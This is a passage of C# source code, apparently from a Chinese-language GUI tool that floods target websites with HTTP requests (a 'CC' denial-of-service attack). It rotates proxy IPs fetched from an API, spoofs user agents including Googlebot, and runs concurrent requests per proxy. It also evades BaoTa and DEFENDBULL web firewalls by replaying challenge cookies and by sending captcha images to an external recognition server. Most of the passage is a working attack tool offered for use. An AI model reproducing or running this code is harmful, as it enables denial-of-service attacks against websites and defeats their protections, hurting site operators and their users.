                    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
                });
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (config.HttpUrlList.Count == 0)
            {
                Log.Info("请设置攻击网址");

                return;
            }

            SaveConfig();

            statisticInfo.CurrentRequest = 0;

            btnStart.Enabled = false;

            timer.Enabled = true;

            backgroundWorker.RunWorkerAsync();
        }

        private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            SaveConfig();

            SaveStatisticInfo();
        }

        /// <summary>
        /// 根据读取的设置 设置控件状态
        /// </summary>
        private void SetControl()
        {
            //多行文本框
            foreach (var item in config.HttpUrlList)
            {
                HttpUrlList.AppendText($"{item}\r\n");
            }

            foreach (var item in config.HttpRequestHeaders)
            {
                HttpRequestHeaders.AppendText($"{item.Key}: {item.Value}\r\n");
            }

            //文本框
            ServerIp.Text = config.ServerIp;

            HttpRequestContent.Text = config.HttpRequestContent;

            HttpTimeout.Text = config.HttpTimeout.ToString();

            NormalWords.Text = config.NormalWords;

            FailWords.Text = config.FailWords;


            ProxyApiUrl.Text = config.ProxyApiUrl;

            ProxyInterval.Text = config.ProxyInterval.ToString();

            ProxyRetry.Text = config.ProxyRetry.ToString();

            ProxyRetryInterval.Text = config.ProxyRetryInterval.ToString();

            ProxyMaxFail.Text = config.ProxyMaxFail.ToString();

            PerProxyLiveSeconds.Text = config.PerProxyLiveSeconds.ToString();

            PerProxyMaxFails.Text = config.PerProxyMaxFails.ToString();

            ProxyServer.Text = config.ProxyServer;

            ProxyUserName.Text = config.ProxyUserName;

            ProxyPassword.Text = config.ProxyPassword;



            WAFWords.Text = config.WAFWords;

            WafVerify.Text = config.WafVerify.ToString();

            LimitTime.Text = config.LimitTime.ToString();

            LimitRequest.Text = config.LimitRequest.ToString();

            SleepTimeMin.Text = config.SleepTimeMin.ToString();

            SleepTimeMax.Text = config.SleepTimeMax.ToString();

            MaxConcurrence.Text = config.MaxConcurrence.ToString();

            Number.Text = config.Number.ToString();

            //复选框
            RandomIp.Checked = config.RandomIp;

            RandomUserAgent.Checked = config.RandomUserAgent;

            RandomSpiderUserAgent.Checked = config.RandomSpiderUserAgent;

            HttpAutomaticDecompression.Checked = config.HttpAutomaticDecompression;

            KeepAlive.Checked = config.KeepAlive;

            Pipelined.Checked = config.Pipelined;

            Initialized = true;
        }

        /// <summary>
        /// 保存设置
        /// </summary>
        private void SaveConfig()
        {
            string configText = JsonHelper.Serialize<Config>(config);

            File.WriteAllText(ConfigFile, configText);

            //日志目录一份            
            File.WriteAllText(LogConfigFile, configText);
        }

        #region 控件事件
        private void HttpUrlList_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.HttpUrlList.Clear();

                string[] lines = HttpUrlList.Text.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

                foreach (var line in lines)
                {
                    config.HttpUrlList.Add(line.Trim());
                }
            }
        }

        private void ServerIp_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.ServerIp = ServerIp.Text;
            }
        }

        private void HttpRequestHeaders_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.HttpRequestHeaders.Clear();

                string[] lines = HttpRequestHeaders.Text.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

                foreach (var line in lines)
                {
                    string[] strArr = line.Split(new char[] { ':' });

                    if (strArr.Length == 2)
                    {
                        config.HttpRequestHeaders.Add(strArr[0].Trim(), strArr[1].Trim());
                    }
                    else if (strArr.Length > 2)
                    {
                        config.HttpRequestHeaders.Add(strArr[0].Trim(), line.Substring(line.IndexOf(strArr[1])).Trim());
                    }
                }
            }
        }

        private void RandomIp_CheckedChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.RandomIp = RandomIp.Checked;
            }
        }

        private void RandomUserAgent_CheckedChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.RandomUserAgent = RandomUserAgent.Checked;
            }
        }

        private void RandomSpiderUserAgent_CheckedChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.RandomSpiderUserAgent = RandomSpiderUserAgent.Checked;
            }
        }

        private void HttpAutomaticDecompression_CheckedChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.HttpAutomaticDecompression = HttpAutomaticDecompression.Checked;
            }
        }

        private void KeepAlive_CheckedChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.KeepAlive = KeepAlive.Checked;
            }
        }

        private void Pipelined_CheckedChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.Pipelined = Pipelined.Checked;
            }
        }

        private void HttpRequestContent_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.HttpRequestContent = HttpRequestContent.Text;
            }
        }

        private void HttpTimeout_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(HttpTimeout.Text))
                {
                    config.HttpTimeout = double.Parse(HttpTimeout.Text);
                }
            }
        }

        private void NormalWords_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.NormalWords = NormalWords.Text;
            }
        }

        private void FailWords_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.FailWords = FailWords.Text;
            }
        }

        private void ProxyApiUrl_TextChanged(object sender, EventArgs e)
        {
            config.ProxyApiUrl = ProxyApiUrl.Text;
        }

        private void ProxyInterval_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(ProxyInterval.Text))
                {
                    config.ProxyInterval = int.Parse(ProxyInterval.Text);
                }
            }
        }

        private void ProxyRetry_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(ProxyRetry.Text))
                {
                    config.ProxyRetry = int.Parse(ProxyRetry.Text);
                }
            }
        }

        private void ProxyRetryInterval_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(ProxyRetryInterval.Text))
                {
                    config.ProxyRetryInterval = int.Parse(ProxyRetryInterval.Text);
                }
            }
        }

        private void ProxyMaxFail_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(ProxyMaxFail.Text))
                {
                    config.ProxyMaxFail = int.Parse(ProxyMaxFail.Text);
                }
            }
        }

        private void PerProxyLiveSeconds_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(PerProxyLiveSeconds.Text))
                {
                    config.PerProxyLiveSeconds = int.Parse(PerProxyLiveSeconds.Text);
                }
            }
        }

        private void PerProxyMaxFails_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(PerProxyMaxFails.Text))
                {
                    config.PerProxyMaxFails = int.Parse(PerProxyMaxFails.Text);
                }
            }
        }

        private void ProxyServer_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.ProxyServer = ProxyServer.Text;
            }
        }

        private void ProxyUserName_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.ProxyUserName = ProxyUserName.Text;
            }
        }

        private void ProxyPassword_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.ProxyPassword = ProxyPassword.Text;
            }
        }

        private void WAFWords_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                config.WAFWords = WAFWords.Text;
            }
        }

        private void WafVerify_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(WafVerify.Text))
                {
                    config.WafVerify = int.Parse(WafVerify.Text);
                }
            }
        }

        private void LimitTime_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(LimitTime.Text))
                {
                    config.LimitTime = double.Parse(LimitTime.Text);

                    ComputeLimit();
                }
            }
        }

        private void LimitRequest_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(LimitRequest.Text))
                {
                    config.LimitRequest = int.Parse(LimitRequest.Text);

                    ComputeLimit();
                }
            }
        }

        /// <summary>
        /// 计算建议值
        /// </summary>
        public void ComputeLimit()
        {
            //多给出一个请求的余地, 避免服务器误封
            int sleepTimeMin = ((int)(config.LimitTime * 1000 / (config.LimitRequest)));

            SleepTimeMin.Text = sleepTimeMin.ToString();

            int sleepTimeMax = (int)(sleepTimeMin * 1.2);

            SleepTimeMax.Text = sleepTimeMax.ToString();
        }

        private void SleepTimeMin_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(SleepTimeMin.Text))
                {
                    config.SleepTimeMin = int.Parse(SleepTimeMin.Text);
                }
            }
        }

        private void SleepTimeMax_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(SleepTimeMax.Text))
                {
                    config.SleepTimeMax = int.Parse(SleepTimeMax.Text);
                }
            }
        }

        private void MaxConcurrence_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(MaxConcurrence.Text))
                {
                    config.MaxConcurrence = int.Parse(MaxConcurrence.Text);
                }
            }
        }

        private void Number_TextChanged(object sender, EventArgs e)
        {
            if (Initialized)
            {
                if (!string.IsNullOrEmpty(Number.Text))
                {
                    config.Number = int.Parse(Number.Text);
                }
            }
        }
        #endregion

        private void backgroundWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            Log.Info("开始穿透网络防火墙进行CC");

            var registry = new Registry();

            //定时器不重入
            registry.Schedule(() => ProxyTimer()).WithName("ProxyTimer").NonReentrant().ToRunNow().AndEvery(config.ProxyInterval).Milliseconds();

            //定时器不重入
            registry.Schedule(() => Timer()).WithName("Timer").NonReentrant().ToRunNow().AndEvery(24).Hours();

            JobManager.JobException += JobManager_JobException;

            JobManager.Initialize(registry);
        }

        private void Timer()
        {
            if (config.PerProxyLiveSeconds == 0)
            {
                return;
            }

            //移除过期代理
            List<string> list = ProxyDic.Keys.ToList();

            int count = 0;

            foreach (var item in list)
            {
                DateTime dateTime;

                if (ProxyDic.TryGetValue(item, out dateTime))
                {
                    if ((DateTime.Now - dateTime).TotalSeconds > config.PerProxyLiveSeconds)
                    {
                        ProxyDic.TryRemove(item, out dateTime);

                        count++;
                    }
                }
            }

            if (count > 0)
            {
                Log.Info($"移除过期代理:{count}");
            }
        }

        private static void JobManager_JobException(JobExceptionInfo obj)
        {
            Log.Info($"定时器 {obj.Name} 发生错误:{obj.Exception.Message}");
        }

        private void ProxyTimer()
        {
            var runTime = DateTime.Now - RunDateTime;

            Log.Info("开始进行获取代理");

            if (string.IsNullOrEmpty(config.ProxyApiUrl))
            {
                if (string.IsNullOrEmpty(config.ProxyServer))
                {
                    config.ProxyServer = LocalProxy;
                }

                Task.Factory.StartNew(() =>
                {
                    RateLimitTask(config.ProxyServer);
                }, TaskCreationOptions.LongRunning);
            }
            else
            {
                string text = string.Empty;

                //重试
                for (int i = 0; i < config.ProxyRetry; i++)
                {
                    text = GetProxyIps();

                    if (string.IsNullOrEmpty(text))
                    {
                        Thread.Sleep(config.ProxyRetryInterval);

                        continue;
                    }
                    else
                    {
                        break;
                    }
                }

                string[] strArr = text.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

                if (strArr.Length > 0)
                {
                    Log.Info($"获取到代理数:{strArr.Length}");

                    ProxyError = 0;
                }
                else
                {
                    ProxyError++;

                    Log.Info($"连续获取代理失败次数:{ProxyError}");
                }

                if (ProxyError >= config.ProxyMaxFail)
                {
                    Log.Info($"获取代理失败次数:{ProxyError}>={config.ProxyMaxFail} 停止获取");

                    JobManager.Stop();
                }

                //每个代理 一个 线程  执行任务
                foreach (var item in strArr)
                {
                    Task.Factory.StartNew(() =>
                    {
                        RateLimitTask(item);
                    }, TaskCreationOptions.LongRunning);

                    Thread.Sleep(50);
                }
            }
        }

        /// <summary>
        /// 获取代理Ip列表
        /// </summary>
        /// <returns></returns>
        public string GetProxyIps()
        {
            string text = string.Empty;

            string result = string.Empty;

            StringBuilder stringBuilder = new StringBuilder();

            try
            {
                Log.Info("开始获取代理");

                //替换Number参数
                string url = config.ProxyApiUrl;

                if (url.Contains("[Number]"))
                {
                    url = url.Replace("[Number]", config.Number.ToString());
                }

                //获取一批代理
                text = HttpHelper.Get(url);

                Log.Debug($"原始代理列表:\r\n{text}");

                string[] strArr = text.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

                int count = 0;

                int num = 0;

                //每个代理 一个 线程  执行任务
                foreach (var item in strArr)
                {
                    if (item.Contains(":"))
                    {
                        string[] ipArr = item.Split(new char[] { ':' }, StringSplitOptions.RemoveEmptyEntries);

                        if (ipArr.Length == 2)
                        {
                            string ip = ipArr[0];

                            if (IsIPv4(ip))
                            {
                                num++;

                                //如果代理池不存在
                                if (!ProxyDic.ContainsKey(ip))
                                {
                                    count++;

                                    ProxyDic.TryAdd(ip, DateTime.Now);

                                    stringBuilder.AppendLine(item);
                                }
                            }
                        }
                    }
                }

                if (num == 0)
                {
                    Log.Info($"获取代理失败:{text}");

                    return string.Empty;
                }
                else
                {
                    Log.Info($"获取到新代理:{count}/{num}");

                    result = stringBuilder.ToString();
                }
            }
            catch
            {

            }

            Log.Debug($"返回代理列表:\r\n{result}");

            return result;
        }

        /// <summary>
        /// 是否IP4地址
        /// </summary>
        /// <param name="value"></param>
        /// <returns></returns>
        public bool IsIPv4(string value)
        {
            IPAddress address;

            if (IPAddress.TryParse(value, out address))
            {
                if (address.AddressFamily == AddressFamily.InterNetwork)
                {
                    return true;
                }
            }

            return false;
        }

        public void RateLimitTask(string proxy)
        {
            Log.Debug($"开始进行代理请求:{proxy}");

            ProxyStatisticInfoDic[proxy] = new StatisticInfo();

            ProxyCookieDic[proxy] = new CookieContainer();

            ProxyUrlList[proxy] = new Queue<string>();

            ProxyConcurrence[proxy] = config.MaxConcurrence;

            //设置请求速率
            //LimitService limitService = new LimitService(config.LimitRequest, config.LimitTime);

            Stopwatch stopwatch = new Stopwatch();

            stopwatch.Start();

            while (true)
            {
                if ((config.PerProxyLiveSeconds > 0) && (stopwatch.Elapsed.TotalSeconds > config.PerProxyLiveSeconds))
                {
                    Log.Debug($"代理请求完成:{proxy} 时长:{stopwatch.Elapsed.ToString("hh\\:mm\\:ss")} 请求总数:{ProxyStatisticInfoDic[proxy].TotalRequest} 请求成功:{ProxyStatisticInfoDic[proxy].SuccessRequest} 请求失败:{ProxyStatisticInfoDic[proxy].FailRequest} 当前请求:{ProxyStatisticInfoDic[proxy].CurrentRequest} 响应流量:{HumanReadableFilesize(ProxyStatisticInfoDic[proxy].RequestBytes)}");

                    break;
                }

                //判断连续出错次数
                if ((config.PerProxyMaxFails > 0) && (ProxyStatisticInfoDic[proxy].FailRequest > config.PerProxyMaxFails))
                {
                    Log.Debug($"代理请求完成:{proxy} 时长:{stopwatch.Elapsed.ToString("hh\\:mm\\:ss")} 请求总数:{ProxyStatisticInfoDic[proxy].TotalRequest} 请求成功:{ProxyStatisticInfoDic[proxy].SuccessRequest} 请求失败:{ProxyStatisticInfoDic[proxy].FailRequest} 当前请求:{ProxyStatisticInfoDic[proxy].CurrentRequest} 响应流量:{HumanReadableFilesize(ProxyStatisticInfoDic[proxy].RequestBytes)}");

                    break;
                }

                //限制请求速率
                //while (true)
                //{
                //    var ret = limitService.IsContinue();

                //    if (ret)
                //    {
                //        break;
                //    }

                //    Thread.Sleep(1);
                //}

                //检测并发数

                //前N个请求 一个一个请求,以应对防火墙
                if (ProxyStatisticInfoDic[proxy].TotalRequest < config.WafVerify)
                {
                    ProxyConcurrence[proxy] = 1;
                }

                //最多同时请求数 ProxyConcurrence[proxy]
                if (ProxyStatisticInfoDic[proxy].CurrentRequest < ProxyConcurrence[proxy])
                {
                    Task.Factory.StartNew(() =>
                    {
                        HttpTask(proxy);
                    }, TaskCreationOptions.LongRunning);
                }

                //随机休息
                if (config.SleepTimeMax > 0)
                {
                    Thread.Sleep(new Random().Next(config.SleepTimeMin, config.SleepTimeMax));
                }
            }
        }

        /// <summary>
        /// Http请求任务
        /// </summary>
        /// <param name="proxy"></param>
        public void HttpTask(string proxy)
        {
            lock (LockObject)
            {
                statisticInfo.TotalRequest++;

                statisticInfo.CurrentRequest++;

                ProxyStatisticInfoDic[proxy].TotalRequest++;

                ProxyStatisticInfoDic[proxy].CurrentRequest++;
            }

            string text = string.Empty;

            string httpUrl = string.Empty;

            byte[] buffer = new byte[0];

            HttpWebResponse httpWebResponse = null;

            Stream responseStream = null;

            string guid = Guid.NewGuid().ToString("N");

            try
            {
                //获取攻击网址
                string url = GetRequestUrl(proxy);

                httpUrl = url.Replace("[Post]", "");

                Log.Debug($"{proxy} {guid} 开始请求:{httpUrl}");

                //获取请求头
                Dictionary<string, string> headers = GetRequestHeader();

                //获取请求
                HttpWebRequest httpWebRequest = GetRequest(url, headers, proxy);

                if (httpWebRequest.Method.ToLower() == "post")
                {
                    //写入数据内容
                    string content = GetRequestContent();

                    byte[] bytes = Encoding.UTF8.GetBytes(content);

                    Stream requestStream = httpWebRequest.GetRequestStream();

                    requestStream.Write(bytes, 0, bytes.Length);

                    requestStream.Close();
                }
                else
                {
                    //移除Post请求才有的请求头
                    string XRequestedWith = "X-Requested-With";

                    string[] keys = httpWebRequest.Headers.AllKeys;

                    foreach (var item in keys)
                    {
                        if (item.ToLower() == XRequestedWith.ToLower())
                        {
                            httpWebRequest.Headers.Remove(item);

                            break;
                        }
                    }
                }

                httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();

                responseStream = httpWebResponse.GetResponseStream();

                MemoryStream memoryStream = new MemoryStream();

                responseStream.CopyTo(memoryStream);

                buffer = memoryStream.ToArray();

                memoryStream.Close();

                lock (LockObject)
                {
                    statisticInfo.SuccessRequest++;

                    ProxyStatisticInfoDic[proxy].SuccessRequest++;

                    statisticInfo.RequestBytes += buffer.Length;

                    ProxyStatisticInfoDic[proxy].RequestBytes += buffer.Length;
                }

                Log.Debug($"{proxy} {guid} 请求完成,响应流量:{buffer.Length}");

                if (httpWebRequest.Method.ToLower() == "get")
                {
                    string contentType = httpWebResponse.ContentType;

                    //过滤字体 css js 图像 视频
                    if (contentType.Contains("font") || contentType.Contains("css") || contentType.Contains("image") || contentType.Contains("javascript") || contentType.Contains("octet-stream") || contentType.Contains("video") || contentType.Contains("mp4"))
                    {

                    }
                    else
                    {
                        text = Encoding.UTF8.GetString(buffer);
                    }
                }
                else
                {
                    text = Encoding.UTF8.GetString(buffer);
                }

                ////保存响应为文件
                //Uri uri = new Uri(url.Replace("[Post]", ""));

                //string file = uri.Segments[uri.Segments.Length - 1];

                //if (file == "/" || file == "")
                //{
                //    file = $"{guid}.html";
                //}
                //else
                //{
                //    if (file.Contains("."))
                //    {
                //        file = $"{guid}_{file}";
                //    }
                //    else
                //    {
                //        file = $"{guid}_{file}.html";
                //    }
                //}

                //FileInfo fileInfo = new FileInfo($"Proxy\\{proxy.Replace(":", ".")}\\{file}");

                //if (!fileInfo.Directory.Exists)
                //{
                //    fileInfo.Directory.Create();
                //}

                //File.WriteAllBytes(fileInfo.FullName, buffer);
            }
            catch (WebException webException)
            {
                lock (LockObject)
                {
                    statisticInfo.FailRequest++;

                    ProxyStatisticInfoDic[proxy].FailRequest++;
                }

                switch (webException.Status)
                {
                    case WebExceptionStatus.ConnectFailure:

                        Log.Debug($"{proxy} {guid} 请求失败 WebException: 无法连接到远程服务器");

                        break;

                    case WebExceptionStatus.ReceiveFailure:

                        Log.Debug($"{proxy} {guid} 请求失败 WebException: 基础连接已经关闭: 接收时发生错误");

                        break;

                    case WebExceptionStatus.SendFailure:

                        Log.Debug($"{proxy} {guid} 请求失败 WebException: 基础连接已经关闭: 发送时发生错误");

                        break;

                    case WebExceptionStatus.ProtocolError:

                        //出现401及403及407代理验证 统计出错次数
                        if (webException.Message.Contains("401") || webException.Message.Contains("403") || webException.Message.Contains("407"))
                        {

                        }
                        else
                        {
                            lock (LockObject)
                            {
                                statisticInfo.FailRequest--;

                                ProxyStatisticInfoDic[proxy].FailRequest--;
                            }
                        }

                        HttpWebResponse response = (HttpWebResponse)webException.Response;

                        if (response != null)
                        {
                            try
                            {
                                Stream stream = webException.Response.GetResponseStream();

                                if (stream != null)
                                {
                                    MemoryStream memoryStream = new MemoryStream();

                                    stream.CopyTo(memoryStream);

                                    buffer = memoryStream.ToArray();

                                    memoryStream.Close();

                                    stream.Close();

                                    text = Encoding.UTF8.GetString(buffer);
                                }
                            }
                            catch (Exception exception)
                            {
                                Log.Info($"{proxy} {guid} 请求失败 WebException 获取响应失败:{exception.Message}");
                            }
                        }

                        break;

                    case WebExceptionStatus.ConnectionClosed:

                        Log.Debug($"{proxy} {guid} 请求失败 WebException: 基础连接已经关闭: 连接被意外关闭");

                        break;

                    case WebExceptionStatus.KeepAliveFailure:

                        Log.Debug($"{proxy} {guid} 请求失败 WebException: 基础连接已经关闭: 服务器关闭了本应保持活动状态的连接");

                        break;

                    case WebExceptionStatus.Timeout:

                        Log.Debug($"{proxy} {guid} 请求失败 WebException: 请求超时");

                        //请求超时 不计入 失败次数
                        lock (LockObject)
                        {
                            statisticInfo.FailRequest--;

                            ProxyStatisticInfoDic[proxy].FailRequest--;
                        }

                        break;

                    case WebExceptionStatus.ServerProtocolViolation:

                        Log.Debug($"{proxy} {guid} 请求失败 WebException: 服务器提交了协议冲突");

                        break;

                    case WebExceptionStatus.RequestCanceled:

                        Log.Debug($"{proxy} {guid} 请求失败 WebException: 请求被中止: 请求已被取消");

                        break;

                    default:

                        Log.Info($"{proxy} {guid} 请求失败 WebException: {webException.Message} Status: {webException.Status}");

                        break;
                }
            }
            catch (Exception exception)
            {
                lock (LockObject)
                {
                    statisticInfo.FailRequest++;

                    ProxyStatisticInfoDic[proxy].FailRequest++;
                }

                Log.Info($"{proxy} {guid} 请求失败 Exception:{exception.Message}");
            }
            finally
            {
                if (responseStream != null)
                {
                    responseStream.Close();
                }

                if (httpWebResponse != null)
                {
                    httpWebResponse.Close();
                }
            }

            #region 防火墙
            //防火墙 CSS JS 图片不会跳转
            if (!string.IsNullOrEmpty(text))
            {
                //宝塔防火墙 跳转验证
                if (text.Contains("<title>检测中</title><div>跳转中</div></html>"))
                {
                    Log.Debug($"{proxy} {guid} 检测到宝塔防火墙,开始跳转");

                    string newUrl = text.Substring("<script> window.location.href =\"", "\"; </script>");

                    if (string.IsNullOrEmpty(newUrl))
                    {
                        Log.Info($"{proxy} {guid} 宝塔防火墙获取跳转地址失败");
                    }
                    else
                    {
                        Uri uri = new Uri(httpUrl);

                        newUrl = $"{uri.Scheme}://{uri.Host}{newUrl}";

                        try
                        {
                            Log.Debug($"{proxy} {guid} 宝塔防火墙进行跳转:{newUrl}");

                            HttpGetPost(newUrl, string.Empty, proxy);
                        }
                        catch (Exception exception)
                        {
                            Log.Info($"{proxy} {guid} 宝塔防火墙跳转出错:{exception.Message}");
                        }
                    }
                }
                //宝塔防火墙 图片验证
                else if ((text.Contains("<title>宝塔防火墙</title>") && text.Contains("此为人机校验，请输入验证码来继续访问")) || text.Contains("请手动输入下面验证码"))
                {
                    Log.Debug($"{proxy} {guid} 宝塔防火墙出现图片验证码验证");

                    //修改最大并发数
                    ProxyConcurrence[proxy] = 1;

                    string timeStamp = DateTimeHelper.GetTimeStamp(true).ToString();

                    //获取验证码
                    Uri uri = new Uri(httpUrl);

                    string server = $"{uri.Scheme}://{uri.Host}";

                    byte[] bytes = HttpGet($"{server}/get_btwaf_captcha_base64?captcha={timeStamp}", proxy);

                    string captcha = Encoding.UTF8.GetString(bytes);

                    BtWafCaptcha btWafCaptcha = JsonHelper.DeSerialize<BtWafCaptcha>(captcha);

                    //保存响应为文件
                    //File.WriteAllBytes($"BtWafCaptcha\\captcha_{timeStamp}.txt", bytes);

                    if (btWafCaptcha.status)
                    {
                        Image bitmap = ConvertBase64ToImage(btWafCaptcha.msg);

                        string file_name = $"{BtWafCaptchaDir}\\{timeStamp}.png";

                        bitmap.Save(file_name);

                        bitmap.Dispose();

                        string pred_reslt = predict(file_name);

                        if ((!string.IsNullOrEmpty(pred_reslt)) && pred_reslt.Length >= 4 && pred_reslt.Length <= 6)
                        {
                            ////验证码错误
                            //验证验证码 "msg" : "验证成功",         "status" : true
                            bytes = HttpGet($"{server}/Verification_auth_btwaf?captcha={pred_reslt}", proxy);

                            captcha = Encoding.UTF8.GetString(bytes);

                            if (captcha.Contains("验证成功"))
                            {
                                Log.Debug($"{proxy} {guid} 宝塔防火墙图片验证码验证成功,验证码识别:{file_name} 验证码为:{pred_reslt}");

                                File.Move(file_name, $"{BtWafCaptchaDir}\\{pred_reslt}_{timeStamp}.png");

                                //还原最大并发数
                                ProxyConcurrence[proxy] = config.MaxConcurrence;
                            }
                            else
                            {
                                Log.Debug($"{proxy} {guid} 验证码识别:{file_name} 验证码为:{pred_reslt} 失败");
                            }
                        }
                        else
                        {
                            Log.Debug($"{proxy} {guid} 验证码识别:{file_name} 验证码为:{pred_reslt},预估失败");
                        }
                    }
                    else
                    {
                        Log.Info($"{proxy} {guid} 获取宝塔防火墙图片验证码失败 {btWafCaptcha.msg}");
                    }
                }
                //防御牛
                else if (text.Contains("<title>DEFENDBULL Anti-CC</title>") && text.Contains("<div>正在检测访问安全性，请稍候...</div>"))
                {
                    string cookie = text.Substring("document.cookie = '", ";");

                    Log.Debug($"{proxy} {guid} 检测到防御牛防CC,Cookie:{cookie}");

                    string[] strArr = cookie.Split(new char[] { '=' });

                    //添加Cookie
                    if (strArr.Length == 2)
                    {
                        Uri uri = new Uri(httpUrl);

                        ProxyCookieDic[proxy].Add(new Cookie(strArr[0], strArr[1], "/", uri.Host));
                    }
                }
                else if (text.Contains("<title>DEFENDBULL Anti-CC</title>") && text.Contains("向右拖动滑块填充拼图"))
                {
                    Log.Info($"{proxy} {guid} 检测到防御牛防CC,需要拖动滑块填充拼图");
                }
            }

            if (!string.IsNullOrEmpty(text))
            {
                string[] strArr = config.WAFWords.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);

                List<string> wordList = new List<string>(strArr);

                //如果包含防火墙关键词
                foreach (var item in wordList)
                {
                    if (text.Contains(item))
                    {
                        Log.Info($"{proxy} {guid} 检测到防火墙关键词:{item}");

                        break;
                    }
                }
            }

            if (!string.IsNullOrEmpty(text))
            {
                string[] strArr = config.NormalWords.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);

                List<string> wordList = new List<string>(strArr);

                bool containsNormal = false;

                //正常关键词
                foreach (var item in wordList)
                {
                    if (text.Contains(item))
                    {
                        containsNormal = true;

                        break;
                    }
                }

                if (!containsNormal)
                {
                    if (!containFailWord(text))
                    {
                        Log.Info($"{proxy} {guid} 未检测到正常响应关键词:{text}");
                    }
                }
            }

            lock (LockObject)
            {
                statisticInfo.CurrentRequest--;

                ProxyStatisticInfoDic[proxy].CurrentRequest--;
            }
            #endregion
        }

        /// <summary>
        /// 是否包含请求失败内容
        /// </summary>
        /// <param name="text"></param>
        /// <returns></returns>
        public bool containFailWord(string text)
        {
            bool result = false;

            if (!string.IsNullOrEmpty(text))
            {
                string[] strArr = config.FailWords.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);

                List<string> wordList = new List<string>(strArr);

                //关键词
                foreach (var item in wordList)
                {
                    if (text.Contains(item))
                    {
                        result = true;

                        break;
                    }
                }
            }

            return result;
        }

        public string ConvertImageToBase64(Image file)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                file.Save(memoryStream, file.RawFormat);
                byte[] imageBytes = memoryStream.ToArray();
                return Convert.ToBase64String(imageBytes);
            }
        }

        public Image ConvertBase64ToImage(string base64String)
        {
            byte[] imageBytes = Convert.FromBase64String(base64String);
            using (MemoryStream ms = new MemoryStream(imageBytes, 0, imageBytes.Length))
            {
                ms.Write(imageBytes, 0, imageBytes.Length);
                return Image.FromStream(ms, true);
            }
        }

        /// <summary>
        /// 人工智能识别验证码
        /// </summary>
        /// <param name="file"></param>
        /// <returns></returns>
        public string predict(string file)
        {
            string result = string.Empty;

            WebClient webClient = new WebClient();

            try
            {
                byte[] bytes = webClient.UploadFile("http://www.91nin.com:5000/predict", file);

                result = Encoding.UTF8.GetString(bytes);
            }
            catch
            {

            }
            finally
            {
                webClient.Dispose();
            }

            return result;
        }

        /// <summary>
        /// 获取请求网址
        /// </summary>
        /// <param name="proxy"></param>
        /// <returns></returns>
        public string GetRequestUrl(string proxy)
        {
            string requestUrl = string.Empty;

            lock (LockObject)
            {
                if (ProxyUrlList[proxy].Count == 0)
                {
                    InitUrlList(proxy);
                }

                requestUrl = ProxyUrlList[proxy].Dequeue();
            }

            //替换随机数字 字符串
            while ((!string.IsNullOrEmpty(requestUrl)) && requestUrl.Contains("[Number,"))
            {
                string text = requestUrl.Substring("[Number,", "]");

                string[] strArr = text.Split(new char[] { ',' });

                string number = string.Empty;

                if (strArr.Length == 1)
                {
                    //数字长度[Number, 10]
                    number = GetRandomString(int.Parse(strArr[0]), true, false, false);
                }
                else
                {
                    //[Number,10,30] 数字最小值,数字最大值

                    int min = int.Parse(strArr[0]);

                    int max = int.Parse(strArr[1]);

                    int num = new Random().Next(min, max);

                    number = num.ToString();
                }

                requestUrl = requestUrl.Replace($"[Number,{text}]", number);
            }

            //替换字符串
            while ((!string.IsNullOrEmpty(requestUrl)) && requestUrl.Contains("[String,"))
            {
                string text = requestUrl.Substring("[String,", "]");

                string[] strArr = text.Split(new char[] { ',' });

                string randomString = string.Empty;

                if (strArr.Length == 1)
                {
                    //字符串长度
                    randomString = GetRandomString(int.Parse(strArr[0]));
                }
                else
